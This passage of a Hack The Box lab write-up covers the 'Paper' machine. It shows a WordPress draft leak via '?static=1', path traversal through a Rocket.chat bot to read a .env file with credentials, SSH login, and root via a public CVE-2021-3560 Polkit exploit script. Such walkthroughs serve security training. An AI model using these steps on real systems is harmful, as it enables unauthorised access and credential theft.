src="/img/paper-htb/wordpress.png"></p><p>Upon reviewing the WordPress 5.2.3 version and its known vulnerabilities, we identified CVE-2019-17671, which allows viewing private posts or drafts without proper authorization. The following PoC illustrates this issue.</p><p><a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/">https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/</a></p><p><img src="/img/paper-htb/wordpress-exploit.png"></p><p>According to the vulnerability details, it’s possible to leak the content of private posts or drafts by appending <code>?static=1</code> to the URL.</p><p><img src="/img/paper-htb/static.png"></p><p>Discovered a new subdomain: <code>chat.office.paper</code>:</p><p><img src="/img/paper-htb/hidden-url.png"></p><p>We add it into our hosts file:</p><p><img src="/img/paper-htb/newhost.png"></p><h2 id="Rocket-chat"><a href="#Rocket-chat" class="headerlink" title="Rocket.chat:"></a>Rocket.chat:</h2><p>The registration URL takes us to the chat system <code>rocket.chat</code>.</p><p><img src="/img/paper-htb/rocket-chat.png"></p><p>After entering we see the only channel, <strong>#general</strong>.<br>Within the channel, multiple messages were visible, some of which mentioned a bot and listed the commands it accepts. Based on this, we initiated a conversation with the bot to further explore its functionality.</p><p><img src="/img/paper-htb/general.png"><br>We sent the <code>help</code> command to the bot, which returned a list of available commands. Among them, two stood out as particularly interesting: <code>file</code> and <code>list</code>.<br><img src="/img/paper-htb/help-bot.png"></p><p><img src="/img/paper-htb/list-cmd.png"></p><p>We perform an enumeration of files within the directory using <code>../</code>we see multiple directories&#x2F;files in <code>home/dwight</code>.</p><p><img src="/img/paper-htb/homedir.png"></p><p>Inside the <code>hubot/</code> directory, we found configuration files and the bot’s source code. Notably, the <code>.env</code> file contained the bot’s configuration details, including credentials.</p><p><img src="/img/paper-htb/config.png"></p><p>We use the password via SSH with the user <code>dwight</code>, we manage to obtain a shell and the flag <code>user.txt</code>.</p><p><img src="/img/paper-htb/ssh.png"></p><h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation:"></a>Privilege escalation:</h2><p>It’s time to escalate our privileges to the root user. To begin, we need to enumerate the system for further information. After downloading <code>linpeas.sh</code>, the script revealed that the system is vulnerable to CVE-2021-3560.</p><p><img src="/img/paper-htb/cvepriv.png"></p><p>According to this <a href="https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/">GitHub blog post</a>, CVE-2021-3560 is a vulnerability in PolKit (PolicyKit), a system service used to manage permissions. The flaw allows an attacker with limited access to gain root privileges. By exploiting this vulnerability, the attacker can trick the system into creating a new superuser account or escalating their own privileges to root, bypassing security restrictions that would normally prevent this.</p><p>To exploit this vulnerability, we will use a script that automates the process. The script, available on <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">GitHub</a></p><p>After downloading the script from GitHub, we used <code>wget</code> to send it to the target system, where it could be executed to exploit the vulnerability.</p><p><img src="/img/paper-htb/exploit.png"></p><p><img src="/img/paper-htb/sendexploit.png"></p><p>We ran the script, and the execution was successful:</p><p><img src="/img/paper-htb/runexploit.png"></p><p>We switched the user to <code>secnigma</code> by exploiting the Polkit vulnerability and then ran <code>sudo bash</code>, which granted us a root shell</p><p><img src="/img/paper-htb/secnigma.png"></p><p>Finally, we accessed and retrieved the root flag.</p><p><img src="/img/paper-htb/root.png"></p><h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :))"></a>Thanks For Reading :))</h2><p><img src="/img/paper-htb/Ghibli3.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>Linux</tag>
      
      <tag>Easy</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
